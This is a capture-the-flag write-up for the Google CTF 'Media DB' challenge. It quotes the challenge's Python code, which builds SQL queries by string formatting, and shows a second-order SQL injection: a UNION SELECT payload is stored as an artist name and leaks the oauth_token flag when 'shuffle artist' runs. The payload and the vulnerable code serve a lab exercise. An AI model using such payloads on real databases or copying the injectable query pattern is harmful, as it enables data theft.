### MEDIA-DB
[Challenge Link](https://capturetheflag.withgoogle.com/?#beginners/misc-media-db)

#### Static Analysis
- `media-db.py` : We need to get data from `oauth_token` column in `oauth_tokens` table

		c.execute("CREATE TABLE oauth_tokens (oauth_token text)")
		c.execute("INSERT INTO oauth_tokens VALUES ('{}')".format(flag))

- input sanitization is different in 1) from 2),3) and it os possible to use `'` when we add a song

		# 1) add song
		artist = raw_input().replace('"', "")
		song = raw_input().replace('"', "")
		c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))
		
		# 2) play artist
		artist = raw_input().replace("'", "")
		print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
		
		# 3) play song
		song = raw_input().replace("'", "")
		print_playlist("SELECT artist, song FROM media WHERE song = '{}'".format(song))
		
		# 4) shuffle artist
		artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
		print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
		
- Well, let's try a	sqli trick	

		>>> artist = raw_input().replace('"', "")
		' union select oauth_token,oauth_token from oauth_tokens;--'
		>>> print "SELECT artist, song FROM media WHERE artist = '{}'".format(artist)
		SELECT artist, song FROM media WHERE artist = '' union select oauth_token,oauth_token from oauth_tokens;--''

- Got Flag
		
		$ nc media-db.ctfcompetition.com 1337
		=== Media DB ===
		1) add song
		2) play artist
		3) play song
		4) shuffle artist
		5) exit
		> 1
		artist name?
		' union select oauth_token,oauth_token from oauth_tokens;--'
		song name?
		does it really matter?

		1) add song
		2) play artist
		3) play song
		4) shuffle artist
		5) exit
		> 4
		choosing songs from random artist: ' union select oauth_token,oauth_token from oauth_tokens;--'

		== new playlist ==
		1: "CTF{fridge_cast_oauth_token_cahn4Quo}
		" by "CTF{fridge_cast_oauth_token_cahn4Quo}
		"
